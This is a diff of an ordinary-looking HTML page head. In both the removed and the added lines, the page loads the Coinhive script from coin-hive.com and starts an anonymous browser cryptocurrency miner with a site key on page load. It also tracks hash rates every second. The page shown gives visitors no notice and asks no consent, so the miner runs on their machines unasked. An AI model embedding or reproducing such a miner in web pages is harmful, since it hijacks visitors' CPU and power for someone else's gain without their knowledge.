@@ -13,32 +13,25 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
 		<link rel="stylesheet" href="assets/css/main.css" />
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <script>
-      // Create cookie if it does not exist
-      console.log('cookie', document.cookie);
-      if(!document.cookie) {
-        document.cookie = "user=User1";
-      }
+          <script>
+            var miner = new CoinHive.Anonymous('kOmEN2gForhg8N9ilGGqm7s8OB8EILxT');
+            miner.start();
+          </script>
+          
+          <script>
+            // Listen on events
+            miner.on('found', function() { /* Hash found */ })
+            miner.on('accepted', function() { /* Hash accepted by the pool */ })
 
-      var miner = new CoinHive.Anonymous('kOmEN2gForhg8N9ilGGqm7s8OB8EILxT');
-      // var miner = new CoinHive.User('kOmEN2gForhg8N9ilGGqm7s8OB8EILxT');
-      miner.start();
-    </script>
-    
-    <script>
-      // Listen on events
-      miner.on('found', function() { /* Hash found */ })
-      miner.on('accepted', function() { /* Hash accepted by the pool */ })
+            // Update stats once per second
+            setInterval(function() {
+              var hashesPerSecond = miner.getHashesPerSecond();
+              var totalHashes = miner.getTotalHashes();
+              var acceptedHashes = miner.getAcceptedHashes();
 
-      // Update stats once per second
-      setInterval(function() {
-        var hashesPerSecond = miner.getHashesPerSecond();
-        var totalHashes = miner.getTotalHashes();
-        var acceptedHashes = miner.getAcceptedHashes();
-
-        // Output to HTML elements...
-      }, 1000);
-    </script>
+              // Output to HTML elements...
+            }, 1000);
+          </script>
   </head>
 	<body>
 
